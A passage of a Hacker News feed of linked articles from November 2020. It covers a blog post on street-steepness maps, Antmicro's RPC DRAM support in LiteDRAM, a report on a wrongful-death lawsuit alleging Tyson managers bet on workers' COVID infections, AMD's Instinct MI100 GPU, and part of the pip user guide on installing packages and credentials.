<em>(unter Mitwirkung der Gauverbände des Deutschen Radfahrerbundes und der Konsulate der Allgemeinen Radfahrer-Union)</em>. They seem to date from the beginning of the 20th century, and are not yet collectable, if the <a href="http://www.abebooks.co.uk/Deutsche-Strassenprofilkarte-Radfahrer-Mitwirkung-Gauverb%C3%A4nde-Deutschen/6461038791/bd">prices on Abebooks</a> are anything to go by.</p><p>And in one of those curious coincidences…</p><p>I originally finished this post with “<span>I don’t expect to see a revival any day soon”, but the day after I posted this, Sustrans Midlands retweeted a link to <a href="https://twitter.com/Lunto_Sustrans/status/496934542880833536">exactly such a map</a>. This ‘Accessible Map’ of Queenstown, New Zealand, was particularly intended for wheelchair users and other people who find steep slopes challenging:</span></p><p><img src="http://blog.systemed.net/images/original/modern_elevation_map.jpg"></p><p><span>You can download the full map as a PDF from drcqueenstown.co.nz. The cartographer, Toby Eglesfield, has also written an <a href="http://www.tobyeglesfield.com/a-map-showing-the-steepness-of-streets/">extensive, well-illustrated blog post</a> explaining the design choices he made – and&nbsp;in the comments, two people raise the idea of generating such a map from OpenStreetMap data. Now wouldn’t that be an interesting challenge…</span></p>
				<p id="date">Posted on Tuesday 5 August 2014. 
				<a href="http://blog.systemed.net/post/10">Link.</a></p>
				<h3>Previous post: <a href="http://blog.systemed.net/post/9">Normalising OpenStreetMap tag ambiguities by location.</a></h3>
			</div></div>]]>
            </description>
            <link>http://blog.systemed.net/post/10</link>
            <guid isPermaLink="false">hacker-news-small-sites-25145965</guid>
            <pubDate>Thu, 19 Nov 2020 03:39:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[RPC DRAM support in open source DRAM controller]]>
            </title>
            <description>
<![CDATA[
Score 31 | Comments 9 (<a href="https://news.ycombinator.com/item?id=25145897">thread link</a>) | @pabs3
<br/>
November 18, 2020 | https://antmicro.com/blog/2020/10/rpc-dram-support-in-litedram/ | <a href="https://web.archive.org/web/*/https://antmicro.com/blog/2020/10/rpc-dram-support-in-litedram/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
        <p>
          <span>Published:</span>
          <time>Oct 28 2020</time>
        </p>
          <p>
            <span>Topics:</span>
            open hardware, open ASICs, open FPGA</p>
      </div><div>
        <p>The Internet of Things is one of the areas that is hugely benefiting from miniaturization of semiconductor technologies, as more computing power can be encapsulated into increasingly smaller devices. Shrinking in size and requiring less power, various devices - including AI-capable ones - are applied in ways that were not possible a few years ago. One of the new and exciting developments in this space is the emergence of <a href="https://etronamerica.com/products/rpc-dram/">RPC (reduced pin-count) DRAM</a> - a small form factor memory, for which Antmicro has developed support in the open source memory controller, LiteDRAM. Our contribution, already made available on <a href="https://github.com/antmicro/litedram/tree/rpc-dram-support">GitHub</a> is being polished and undergoing final tests, and will be mainlined shortly.</p>

<h3 id="what-is-rpc-dram">What is RPC DRAM</h3>

<p>Standard modern DRAM chips, with their small but not miniscule footprints and rather high I/O requirements, are impossible to use in space-constrained applications. By using a large number of pins in the device they connect to, they can also push the envelope of the device itself even more, requiring larger and more expensive packages of the FPGA or SoC used. <br>
And while many edge devices could easily do with a smaller amount (e.g. sub-1Gb) of RAM than what modern memory parts offer, it is impossible to cut a RAM chip in half and get less memory capacity. Well, at least until now - kind of.</p>

<p>The so-called RPC (Reduced Pin Count) DRAM - a new technology from Etron - has the potential to profoundly impact the AI, IoT and VR/AR markets. It is a tiny memory chip family which can get as small as 1.96mm x 4.63mm, offering 256Mbits and high bandwidth (the same as DDR3) using only 10% of the DDR3 PCB area and only half of the SoC or FPGA pins that the DDR3 memory takes up. Its clock speed can go up to 1200MHz, with bandwidth of up to 4800 Mb/s.</p>

<p><img src="https://antmicro.com/blog/images/LiteDRAM_with_RPC_RAM_blog-note.png" alt="DDR RAM and RPC DRAM comparison"></p>

<p>RPC DRAM is ideal for space-constrained edge AI applications that locally process data such as video, audio or image, where, apart from space saving, low power consumption is critical. The small number of pins used by RPC DRAM leaves more available resources for other system functionalities, while the possibility of stacking multiple RPC DRAM chips on top of one another for further layout optimization makes the technology even more appealing. It also enables interesting scenarios like <a href="https://antmicro.com/blog/2020/10/open-chiplet-initiative/#future-developments">embedding in a chiplet-based SiP</a>, or even bare-die integration with small FPGAs for a powerful, Linux-capable device. But to use the memory with FPGAs, you need to interface with it using a DRAM controller - and that is where our latest work with LiteDRAM comes in.</p>

<h3 id="litedram-and-open-source-ip-ecosystem">LiteDRAM and open source IP ecosystem</h3>

<p>LiteDRAM is a configurable memory controller that is part of LiteX, an open source SoC builder that we are developing and using to design FPGA-based systems. By creating support for RPC DRAM in LiteDRAM we have enabled the miniscule memory to be added to products that we build and to the whole LiteX ecosystem. This enables our customer’s devices to run more compute-hungry applications or full-fledged operating systems such as Linux in dedicated SoCs created by Antmicro on demand.</p>

<p>We use and contribute to LiteDRAM, LiteX and other open source IP to develop unique designs interfaced with DDR memories for high-bandwidth video and other data processing systems; and RPC DRAM support is just one example of the enablement work we are performing in the ecosystem. Combined with the exciting work related to open source we are performing as part of <a href="https://antmicro.com/blog/2020/07/swerv-cores-tools-ecosystem/">CHIPS Alliance</a>, <a href="https://antmicro.com/blog/2020/06/skywater-open-source-pdk/">SkyWater PDK</a> and the fantastic enregy catalyzed by the open <a href="https://antmicro.com/technologies/risc-v/">RISC-V</a> CPU architecture (which is an obvious candidate for combining with RPC RAM both in soft- and hard CPU contexts), future is looking bright for tiny, open, ML-capable systems.</p>

<h3 id="antmicros-open-source-fpga-ip">Antmicro’s open source FPGA IP</h3>

<p>We often use FPGAs to build a wide array of configurable systems for our customers, leveraging the flexibility and customizability that this technology offers. We create open source FPGA IPs that are reusable across various designs and platforms without any licensing restrictions imposed on our customers. Antmicro’s open source IP cores portfolio includes MIPI CSI, MIDI, PCIe, USB, Ethernet etc.</p>

<p>The FPGA systems that we build consist of modern, vendor-neutral components that ensure future-proofness and give our clients full control over the product. Reach out to us at <a href="mailto:contact@antmicro.com">contact@antmicro.com</a> if you’d like to get a specialized FPGA-based system performing complex tasks.</p>

      </div></div>]]>
            </description>
            <link>https://antmicro.com/blog/2020/10/rpc-dram-support-in-litedram/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25145897</guid>
            <pubDate>Thu, 19 Nov 2020 03:29:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Lawsuit: Tyson managers bet money on how many workers would contract Covid-19]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25145734">thread link</a>) | @AndrewBissell
<br/>
November 18, 2020 | https://iowacapitaldispatch.com/2020/11/18/lawsuit-tyson-managers-bet-money-on-how-many-workers-would-contract-covid-19/ | <a href="https://web.archive.org/web/*/https://iowacapitaldispatch.com/2020/11/18/lawsuit-tyson-managers-bet-money-on-how-many-workers-would-contract-covid-19/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

        <div><figure><img width="2016" height="1512" src="https://iowacapitaldispatch.com/wp-content/uploads/2020/04/Workstation-Dividers-at-Tyson-Facility.jpg" srcset="https://iowacapitaldispatch.com/wp-content/uploads/2020/04/Workstation-Dividers-at-Tyson-Facility.jpg 2016w, https://iowacapitaldispatch.com/wp-content/uploads/2020/04/Workstation-Dividers-at-Tyson-Facility-300x225.jpg 300w, https://iowacapitaldispatch.com/wp-content/uploads/2020/04/Workstation-Dividers-at-Tyson-Facility-1024x768.jpg 1024w, https://iowacapitaldispatch.com/wp-content/uploads/2020/04/Workstation-Dividers-at-Tyson-Facility-768x576.jpg 768w, https://iowacapitaldispatch.com/wp-content/uploads/2020/04/Workstation-Dividers-at-Tyson-Facility-1536x1152.jpg 1536w, https://iowacapitaldispatch.com/wp-content/uploads/2020/04/Workstation-Dividers-at-Tyson-Facility-80x60.jpg 80w, https://iowacapitaldispatch.com/wp-content/uploads/2020/04/Workstation-Dividers-at-Tyson-Facility-265x198.jpg 265w" sizes="(max-width: 2016px) 100vw, 2016px" alt="" title="Workstation Dividers at Tyson Facility"><figcaption>Tyson workers have had plastic dividers separating them on the production line. (Photo provided by Tyson Fresh Meats)</figcaption></figure></div>
        <p>A wrongful death lawsuit tied to COVID-19 infections in a Waterloo pork processing plant alleges that during the initial stages of the pandemic, Tyson Foods ordered employees to report for work while supervisors privately wagered money on the number of workers who would be sickened by the deadly virus.</p>
<p>Earlier this year, the family of the late Isidro Fernandez sued the meatpacking company, alleging Fernandez was exposed to the coronavirus at the Waterloo plant where he worked. The lawsuit alleges Tyson Foods is guilty of a “willful and wanton disregard for workplace safety.”</p>
<p>In a written statement issued Thursday afternoon, Tyson Foods’ president and chief executive officer, Dean Banks, said: “We are extremely upset about the accusations involving some of the leadership at our Waterloo plant. Tyson Foods is a family company with 139,000 team members and these allegations do not represent who we are, or our core values and team behaviors. We expect every team member at Tyson Foods to operate with the utmost integrity and care in everything we do.</p>
<p>“We have suspended, without pay, the individuals allegedly involved and have retained the law firm Covington &amp; Burling LLP to conduct an independent investigation led by former Attorney General Eric Holder. If these claims are confirmed, we’ll take all measures necessary to root out and remove this disturbing behavior from our company.</p>
<p>“Our top priority is and remains the health and safety of our team members.”</p>
<p>Fernandez, who died on April 20, was one of at least five Waterloo plant employees who died of the virus. According to the Black Hawk County Health Department, more than 1,000 workers at the plant — over a third of the facility’s workforce — contracted the virus.</p>
<p>The lawsuit alleges that despite the uncontrolled spread of the virus at the plant, Tyson required its employees to work long hours in cramped conditions without providing the appropriate personal protective equipment and without ensuring workplace-safety measures were followed.</p>
<p>The lawsuit was recently amended and includes a number of new allegations against the company and plant officials. Among them:</p>
<ul>
<li>In mid-April, around the time Black Hawk County Sherriff Tony Thompson visited the plant and reported the working conditions there “shook [him] to the core,” plant manager Tom Hart organized a cash-buy-in, winner-take-all, betting pool for supervisors and managers to wager how many plant employees would test positive for COVID-19.</li>
<li>John Casey, an upper-level manager at the plant, is alleged to have explicitly directed supervisors to ignore symptoms of COVID-19, telling them to show up to work even if they were exhibiting symptoms of the virus. Casey reportedly referred to COVID-19 as the “glorified flu” and told workers not to worry about it because “it’s not a big deal” and “everyone is going to get it.” On one occasion, Casey intercepted a sick supervisor who was on his way to be tested and ordered him to get back to work, saying, “We all have symptoms — you have a job to do.” After one employee vomited on the production line, managers reportedly allowed the man to continue working and then return to work the next day.</li>
<li>In late March or early April, as the pandemic spread across Iowa, managers at the Waterloo plant reportedly began avoiding the plant floor for fear of contracting the virus. As a result, they increasingly delegated managerial authority and responsibilities to low-level supervisors who had no management training or experience. The supervisors did not require truck drivers and subcontractors to have their temperatures checked before entering the plant.</li>
<li>In March and April, plant supervisors falsely denied the existence of any confirmed cases or positive tests for COVID-19 within the plant, and allegedly told workers they had a responsibility to keep working to ensure Americans didn’t go hungry as the result of a shutdown.</li>
<li>Tyson paid out $500 “thank you bonuses” to employees who turned up for every scheduled shift for three months — a policy decision that allegedly incentivized sick workers to continue reporting for work.</li>
<li>Tyson executives allegedly lobbied Iowa Gov. Kim Reynolds for COVID-19 liability protections that would shield the company from lawsuits, and successfully lobbied the governor to declare that only the state government, not local governments, had the authority to close businesses in response to the pandemic.</li>
</ul>
<p>While Tyson has yet to file a formal response to the new allegations, it has said in previous court filings that it “vigorously disputes” the plaintiffs’ claims and has “invested millions of dollars to provide employees with safety and risk-mitigation equipment.”</p>
<p>The lawsuit claims that while Tyson has repeatedly claimed that its operations needed to remain open to feed America, the company increased its exports to China by 600% during the first quarter of 2020.</p>
<p>The lawsuit is seeking unspecified damages for fraudulent misrepresentation and gross negligence.</p>
<p>The case was initially filed in state court, claiming violations of Iowa law. At Tyson’s request, the case was moved to federal court, with the company claiming it had remained open during the pandemic “at the direction of a federal officer” — President Donald Trump, who, on April 28, invoked his authority under the <a href="https://iowacapitaldispatch.com/2020/05/04/trumps-critics-warn-his-order-to-keep-meat-plants-open-imperils-workers/">Defense Production Act</a> and ordered meat and poultry processing companies to continue operating.</p>
<p>The nonprofit organization Public Citizen has filed an amicus brief in the case, supporting the Fernandez family’s efforts to remand the action back to state court. In its brief, Public Citizen has said that neither the Defense Production Act nor the executive order signed by President Trump had “directed” Tyson to do anything.</p>
<p>The Waterloo facility is Tyson’s largest pork plant in the United States. The facility employs approximately 2,800 workers who process approximately 19,500 hogs per day.</p>

        </div></div>]]>
            </description>
            <link>https://iowacapitaldispatch.com/2020/11/18/lawsuit-tyson-managers-bet-money-on-how-many-workers-would-contract-covid-19/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25145734</guid>
            <pubDate>Thu, 19 Nov 2020 02:57:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[AMD Announces New “Instinct MI100” GPU, Breaks the 10 Tflops Barrier in FP64]]>
            </title>
            <description>
<![CDATA[
Score 19 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25145600">thread link</a>) | @luord
<br/>
November 18, 2020 | https://www.cloudsavvyit.com/8032/amd-announces-new-instinct-mi100-gpu-breaks-the-10-tflops-barrier-in-fp64/ | <a href="https://web.archive.org/web/*/https://www.cloudsavvyit.com/8032/amd-announces-new-instinct-mi100-gpu-breaks-the-10-tflops-barrier-in-fp64/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="article-content-area">
<p><img src="https://www.cloudsavvyit.com/thumbcache/0/0/48301387cddb344c254ee94cde7f04d7/p/uploads/2020/11/db6591d4-1.png" alt="" width="700" height="313"></p>
<p>With the rising demand for HPC and AI-powered cloud applications comes a need for very powerful datacenter GPUs. Usually NVIDIA is the king of this field, but AMD’s latest MI100 GPU presents some serious competition.</p>
<h2 role="heading" aria-level="2">A Card For The HPC Market</h2>
<p>The card is fast, seriously fast. NVIDIA’s high end A100 GPU peaks at&nbsp;9.7 TFLOPS in FP64 workloads. The new “AMD Instinct MI100” leaps past that at 11.5 TFLOPS.</p>
<p><img src="https://www.cloudsavvyit.com/thumbcache/0/0/2f6292f97a12046b544017f07246a4f8/p/uploads/2020/11/8d6e8097.png" alt="" width="700" height="312"></p>
<p>Of course, NVIDIA’s cards support other speedup techniques for AI-specific workloads in different number formats, such as the TensorFloat-32 precision format and<a href="https://www.cloudsavvyit.com/4796/nvidias-new-ampere-gpu-is-a-game-changer-for-artificial-intelligence/"> fine-grained structured sparsity</a>. For AI and Machine Learning workloads, NVIDIA is still king, as their cards are built specifically for tensor-based operations.</p>
<p>But, for general purpose High Performance Computing, the MI100 takes the crown for raw compute power. Plus, it’s nearly half the price, and is much more efficient per watt.</p>
<p>On top of the other improvements, the new architecture also brings mixed-precision improvements, with their “Matrix Core” technology delivering 7x greater FP16 performance compared to their prior generation of cards.</p>
<p><img src="https://www.cloudsavvyit.com/thumbcache/0/0/6588bb99d6c97c60163b08630e9b8d86/p/uploads/2020/11/292c692b.png" alt="" width="700" height="216"></p>
<p>AMD CPUs and Instinct GPUS are <a href="https://www.olcf.ornl.gov/frontier/">both powering two of the US Department of Energy’s exascale supercomputers</a>. The “Frontier” supercomputer is planned to be built next year with current Epyc CPUs and MI100s, and will deliver more than 1.5 exaflops of peak computing power. The “El Capitan” supercomputer is planned to be built in 2023 on next gen hardware, and will deliver more than 2 exaflops of double precision power.</p>
<h2 role="heading" aria-level="2">Can ROCm Live Up to CUDA?</h2>
<p>Of course, all of this power is useless if the software doesn’t support it. It’s no secret that NVIDIA has managed to make machine learning a bit of a walled garden.</p>
<p>NVIDIA’s compute framework is called <a href="https://en.wikipedia.org/wiki/CUDA">CUDA</a>, or&nbsp;Compute Unified Device Architecture. It’s proprietary, and only works with their cards. But since their cards have historically been the fastest, many applications are only built with CUDA support first and foremost.</p>
<p>There are cross-platform programming models, most notably OpenCL, which AMD supports very well <a href="https://rocmdocs.amd.com/en/latest/">with their ROCm platform</a>. Both NVIDIA cards and AMD cards support OpenCL, but because NVIDIA only supports it by transpiling to CUDA, it’s actually slower to use OpenCL with an NVIDIA card. Because of this, not all applications will support it.</p>
<p>Ultimately, you’ll need to do your own research and see if the application you intend to run can be run on AMD cards, and maybe be prepared for some tinkering and bug fixing. NVIDIA GPUs on the otherhand are mostly plug and play, so even if AMD is faster, NVIDIA can continue to hinder them with closed-source software.</p>
<p>However, this situation is getting better—AMD is committed to open sourcing everything and creating an open environment. Tensorflow and PyTorch, two very popular ML frameworks, both support the ROCm ecosystem.</p>
<p><img src="https://www.cloudsavvyit.com/thumbcache/0/0/03aae3c52689bd7fd58e8278df8fefac/p/uploads/2020/11/301c98b9.png" alt="" width="697" height="479"></p>
<p>Hopefully the raw specs of AMD’s latest offerings can push the industry to a more competitive environment. After all, they’re being put to use in supercomputers</p>
</div></div>]]>
            </description>
            <link>https://www.cloudsavvyit.com/8032/amd-announces-new-instinct-mi100-gpu-breaks-the-10-tflops-barrier-in-fp64/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25145600</guid>
            <pubDate>Thu, 19 Nov 2020 02:36:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Changes to the pip dependency resolver in 20.3]]>
            </title>
            <description>
<![CDATA[
Score 76 | Comments 28 (<a href="https://news.ycombinator.com/item?id=25145396">thread link</a>) | @di
<br/>
November 18, 2020 | https://pip.pypa.io/en/latest/user_guide/#changes-to-the-pip-dependency-resolver-in-20-2-2020 | <a href="https://web.archive.org/web/*/https://pip.pypa.io/en/latest/user_guide/#changes-to-the-pip-dependency-resolver-in-20-2-2020">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="user-guide">

<div id="running-pip">
<h2>Running pip<a href="#running-pip" title="Permalink to this headline">¶</a></h2>
<p>pip is a command line program. When you install pip, a <code><span>pip</span></code> command is added
to your system, which can be run from the command prompt as follows:</p>
<div>
<p><label for="tab-set--0-input--1">Unix/macOS</label></p><div>
<div><div><pre><span></span>python -m pip &lt;pip arguments&gt;
</pre></div>
</div>
<p><code><span>python</span> <span>-m</span> <span>pip</span></code> executes pip using the Python interpreter you
specified as python. So <code><span>/usr/bin/python3.7</span> <span>-m</span> <span>pip</span></code> means
you are executing pip for your interpreter located at /usr/bin/python3.7.</p>
</div>
<p><label for="tab-set--0-input--2">Windows</label></p><div>
<div><div><pre><span></span>py -m pip &lt;pip arguments&gt;
</pre></div>
</div>
<p><code><span>py</span> <span>-m</span> <span>pip</span></code> executes pip using the latest Python interpreter you
have installed. For more details, read the <a href="https://docs.python.org/3/using/windows.html#launcher">Python Windows launcher</a> docs.</p>
</div>
</div>
</div>
<div id="installing-packages">
<h2>Installing Packages<a href="#installing-packages" title="Permalink to this headline">¶</a></h2>
<p>pip supports installing from <a href="https://pypi.org/">PyPI</a>, version control, local projects, and
directly from distribution files.</p>
<p>The most common scenario is to install from <a href="https://pypi.org/">PyPI</a> using <a href="https://pip.pypa.io/en/latest/reference/pip_install/#requirement-specifiers"><span>Requirement Specifiers</span></a></p>
<div>
<p><label for="tab-set--1-input--1">Unix/macOS</label></p><div>
<div><div><pre><span></span>python -m pip install SomePackage            <span># latest version</span>
python -m pip install <span>SomePackage</span><span>==</span><span>1</span>.0.4     <span># specific version</span>
python -m pip install <span>'SomePackage&gt;=1.0.4'</span>     <span># minimum version</span>
</pre></div>
</div>
</div>
<p><label for="tab-set--1-input--2">Windows</label></p><div>
<div><div><pre><span></span>py -m pip install SomePackage            <span># latest version</span>
py -m pip install <span>SomePackage</span><span>==</span><span>1</span>.0.4     <span># specific version</span>
py -m pip install <span>'SomePackage&gt;=1.0.4'</span>     <span># minimum version</span>
</pre></div>
</div>
</div>
</div>
<p>For more information and examples, see the <a href="https://pip.pypa.io/en/latest/reference/pip_install/#pip-install"><span>pip install</span></a> reference.</p>
</div>
<div id="basic-authentication-credentials">
<h2>Basic Authentication Credentials<a href="#basic-authentication-credentials" title="Permalink to this headline">¶</a></h2>
<p>pip supports basic authentication credentials. Basically, in the URL there is
a username and password separated by <code><span>:</span></code>.</p>
<p><code><span>https://[username[:password]@]pypi.company.com/simple</span></code></p>
<p>Certain special characters are not valid in the authentication part of URLs.
If the user or password part of your login credentials contain any of the
special characters
<a href="https://en.wikipedia.org/wiki/Percent-encoding#Percent-encoding_reserved_characters">here</a>
then they must be percent-encoded. For example, for a
user with username “user” and password “he//o” accessing a repository at
pypi.company.com, the index URL with credentials would look like:</p>
<p><code><span>https://user:he%2F%2Fo@pypi.company.com</span></code></p>
<p>Support for percent-encoded authentication in index URLs was added in pip 10.0.0
(in <a href="https://github.com/pypa/pip/issues/3236">#3236</a>). Users that must use authentication
for their Python repository on systems with older pip versions should make the latest
get-pip.py available in their environment to bootstrap pip to a recent-enough version.</p>
<p>For indexes that only require single-part authentication tokens, provide the token
as the “username” and do not provide a password, for example -</p>
<p><code><span>https://0123456789abcdef@pypi.company.com</span></code></p>
<div id="netrc-support">
<h3>netrc Support<a href="#netrc-support" title="Permalink to this headline">¶</a></h3>
<p>If no credentials are part of the URL, pip will attempt to get authentication credentials
for the URL’s hostname from the user’s .netrc file. This behaviour comes from the underlying
use of <a href="https://requests.readthedocs.io/en/master/user/authentication/#netrc-authentication">requests</a> which in turn delegates it to the <a href="https://docs.python.org/3/library/netrc.html">Python standard library</a>.</p>
<p>The .netrc file contains login and initialization information used by the auto-login process.
It resides in the user’s home directory. The .netrc file format is simple. You specify lines
with a machine name and follow that with lines for the login and password that are
associated with that machine. Machine name is the hostname in your URL.</p>
<p>An example .netrc for the host example.com with a user named ‘daniel’, using the password
‘qwerty’ would look like:</p>
<div><div><pre><span></span>machine example.com
login daniel
password qwerty
</pre></div>
</div>
<p>As mentioned in the <a href="https://docs.python.org/3/library/netrc.html">standard library docs</a>,
only ASCII characters are allowed. Whitespace and non-printable characters are not allowed in passwords.</p>
</div>
<div id="keyring-support">
<h3>Keyring Support<a href="#keyring-support" title="Permalink to this headline">¶</a></h3>
<p>pip also supports credentials stored in your keyring using the <a href="https://pypi.org/project/keyring/">keyring</a>
library. Note that <code><span>keyring</span></code> will need to be installed separately, as pip
does not come with it included.</p>
<div><div><pre><span></span>pip install keyring
<span>echo</span> your-password <span>|</span> keyring <span>set</span> pypi.company.com your-username
pip install your-package --extra-index-url https://pypi.company.com/
</pre></div>
</div>
</div>
</div>
<div id="using-a-proxy-server">
<h2>Using a Proxy Server<a href="#using-a-proxy-server" title="Permalink to this headline">¶</a></h2>
<p>When installing packages from <a href="https://pypi.org/">PyPI</a>, pip requires internet access, which
in many corporate environments requires an outbound HTTP proxy server.</p>
<p>pip can be configured to connect through a proxy server in various ways:</p>
<ul>
<li><p>using the <code><span>--proxy</span></code> command-line option to specify a proxy in the form
<code><span>[user:passwd@]proxy.server:port</span></code></p></li>
<li><p>using <code><span>proxy</span></code> in a <a href="#config-file"><span>Config file</span></a></p></li>
<li><p>by setting the standard environment-variables <code><span>http_proxy</span></code>, <code><span>https_proxy</span></code>
and <code><span>no_proxy</span></code>.</p></li>
<li><p>using the environment variable <code><span>PIP_USER_AGENT_USER_DATA</span></code> to include
a JSON-encoded string in the user-agent variable used in pip’s requests.</p></li>
</ul>
</div>
<div id="requirements-files">
<h2>Requirements Files<a href="#requirements-files" title="Permalink to this headline">¶</a></h2>
<p>“Requirements files” are files containing a list of items to be
installed using <a href="https://pip.pypa.io/en/latest/reference/pip_install/#pip-install"><span>pip install</span></a> like so:</p>
<div>
<p><label for="tab-set--2-input--1">Unix/macOS</label></p><div>
<div><div><pre><span></span>python -m pip install -r requirements.txt
</pre></div>
</div>
</div>
<p><label for="tab-set--2-input--2">Windows</label></p><div>
<div><div><pre><span></span>py -m pip install -r requirements.txt
</pre></div>
</div>
</div>
</div>
<p>Details on the format of the files are here: <a href="https://pip.pypa.io/en/latest/reference/pip_install/#requirements-file-format"><span>Requirements File Format</span></a>.</p>
<p>Logically, a Requirements file is just a list of <a href="https://pip.pypa.io/en/latest/reference/pip_install/#pip-install"><span>pip install</span></a> arguments
placed in a file. Note that you should not rely on the items in the file being
installed by pip in any particular order.</p>
<p>In practice, there are 4 common uses of Requirements files:</p>
<ol>
<li><p>Requirements files are used to hold the result from <a href="https://pip.pypa.io/en/latest/reference/pip_freeze/#pip-freeze"><span>pip freeze</span></a> for the
purpose of achieving <a href="#repeatability"><span>repeatable installations</span></a>.  In
this case, your requirement file contains a pinned version of everything that
was installed when <code><span>pip</span> <span>freeze</span></code> was run.</p>
<div>
<p><label for="tab-set--3-input--1">Unix/macOS</label></p><div>
<div><div><pre><span></span>python -m pip freeze &gt; requirements.txt
python -m pip install -r requirements.txt
</pre></div>
</div>
</div>
<p><label for="tab-set--3-input--2">Windows</label></p><div>
<div><div><pre><span></span>py -m pip freeze &gt; requirements.txt
py -m pip install -r requirements.txt
</pre></div>
</div>
</div>
</div>
</li>
<li><p>Requirements files are used to force pip to properly resolve dependencies.
pip 20.2 and earlier <a href="https://github.com/pypa/pip/issues/988">doesn’t have true dependency resolution</a>, but instead simply uses the first
specification it finds for a project. E.g. if <code><span>pkg1</span></code> requires
<code><span>pkg3&gt;=1.0</span></code> and <code><span>pkg2</span></code> requires <code><span>pkg3&gt;=1.0,&lt;=2.0</span></code>, and if <code><span>pkg1</span></code> is
resolved first, pip will only use <code><span>pkg3&gt;=1.0</span></code>, and could easily end up
installing a version of <code><span>pkg3</span></code> that conflicts with the needs of <code><span>pkg2</span></code>.
To solve this problem, you can place <code><span>pkg3&gt;=1.0,&lt;=2.0</span></code> (i.e. the correct
specification) into your requirements file directly along with the other top
level requirements. Like so:</p>
<div><div><pre><span></span><span>pkg1</span>
<span>pkg2</span>
<span>pkg3</span><span>&gt;=</span><span>1.0</span><span>,</span><span>&lt;=</span><span>2.0</span>
</pre></div>
</div>
</li>
<li><p>Requirements files are used to force pip to install an alternate version of a
sub-dependency.  For example, suppose <code><span>ProjectA</span></code> in your requirements file
requires <code><span>ProjectB</span></code>, but the latest version (v1.3) has a bug, you can force
pip to accept earlier versions like so:</p>

</li>
<li><p>Requirements files are used to override a dependency with a local patch that
lives in version control.  For example, suppose a dependency
<code><span>SomeDependency</span></code> from PyPI has a bug, and you can’t wait for an upstream
fix.
You could clone/copy the src, make the fix, and place it in VCS with the tag
<code><span>sometag</span></code>.  You’d reference it in your requirements file with a line like
so:</p>
<div><div><pre><span></span><span>git</span><span>+</span><span>https</span><span>:</span><span>//</span><span>myvcs</span><span>.</span><span>com</span><span>/</span><span>some_dependency</span><span>@sometag</span><span>#egg=SomeDependency</span>
</pre></div>
</div>
<p>If <code><span>SomeDependency</span></code> was previously a top-level requirement in your
requirements file, then <strong>replace</strong> that line with the new line. If
<code><span>SomeDependency</span></code> is a sub-dependency, then <strong>add</strong> the new line.</p>
</li>
</ol>
<p>It’s important to be clear that pip determines package dependencies using
<a href="https://setuptools.readthedocs.io/en/latest/setuptools.html#declaring-dependencies">install_requires metadata</a>,
not by discovering <code><span>requirements.txt</span></code> files embedded in projects.</p>
<p>See also:</p>
<ul>
<li><p><a href="https://pip.pypa.io/en/latest/reference/pip_install/#requirements-file-format"><span>Requirements File Format</span></a></p></li>
<li><p><a href="https://pip.pypa.io/en/latest/reference/pip_freeze/#pip-freeze"><span>pip freeze</span></a></p></li>
<li><p><a href="https://caremad.io/2013/07/setup-vs-requirement/">“setup.py vs requirements.txt” (an article by Donald Stufft)</a></p></li>
</ul>
</div>
<div id="constraints-files">
<h2>Constraints Files<a href="#constraints-files" title="Permalink to this headline">¶</a></h2>
<p>Constraints files are requirements files that only control which version of a
requirement is installed, not whether it is installed or not. Their syntax and
contents is nearly identical to <a href="#requirements-files"><span>Requirements Files</span></a>. There is one key
difference: Including a package in a constraints file does not trigger
installation of the package.</p>
<p>Use a constraints file like so:</p>
<div>
<p><label for="tab-set--4-input--1">Unix/macOS</label></p><div>
<div><div><pre><span></span>python -m pip install -c constraints.txt
</pre></div>
</div>
</div>
<p><label for="tab-set--4-input--2">Windows</label></p><div>
<div><div><pre><span></span>py -m pip install -c constraints.txt
</pre></div>
</div>
</div>
</div>
<p>Constraints files are used for exactly the same reason as requirements files
when you don’t know exactly what things you want to install. For instance, say
that the “helloworld” package doesn’t work in your environment, so you have a
local patched version. Some things you install depend on “helloworld”, and some
don’t.</p>
<p>One way to ensure that the patched version is used consistently is to
manually audit the dependencies of everything you install, and if “helloworld”
is present, write a requirements file to use when installing that thing.</p>
<p>Constraints files offer a better way: write a single constraints file for your
organisation and use that everywhere. If the thing being installed requires
“helloworld” to be installed, your fixed version specified in your constraints
file will be used.</p>
<p>Constraints file support was added in pip 7.1. In <a href="#resolver-changes-2020"><span>Changes to the pip dependency resolver in 20.3 (2020)</span></a> we did a fairly comprehensive overhaul, removing several
undocumented and unsupported quirks from the previous implementation,
and stripped constraints files down to being purely a way to specify
global (version) limits for packages.</p>
</div>
<div id="installing-from-wheels">
<h2>Installing from Wheels<a href="#installing-from-wheels" title="Permalink to this headline">¶</a></h2>
<p>“Wheel” is a built, archive format that can greatly speed installation compared
to building and installing from source archives. For more information, see the
<a href="https://wheel.readthedocs.io/">Wheel docs</a> , <span id="index-0"></span><a href="https://www.python.org/dev/peps/pep-0427"><strong>PEP 427</strong></a>, and <span id="index-1"></span><a href="https://www.python.org/dev/peps/pep-0425"><strong>PEP 425</strong></a>.</p>
<p>pip prefers Wheels where they are available. To disable this, use the
<a href="https://pip.pypa.io/en/latest/reference/pip_install/#install-no-binary"><span>--no-binary</span></a> flag for <a href="https://pip.pypa.io/en/latest/reference/pip_install/#pip-install"><span>pip install</span></a>.</p>
<p>If no satisfactory wheels are found, pip will default to finding source
archives.</p>
<p>To install directly from a wheel archive:</p>
<div>
<p><label for="tab-set--5-input--1">Unix/macOS</label></p><div>
<div><div><pre><span></span>python -m pip install SomePackage-1.0-py2.py3-none-any.whl
</pre></div>
</div>
</div>
<p><label for="tab-set--5-input--2">Windows</label></p><div>
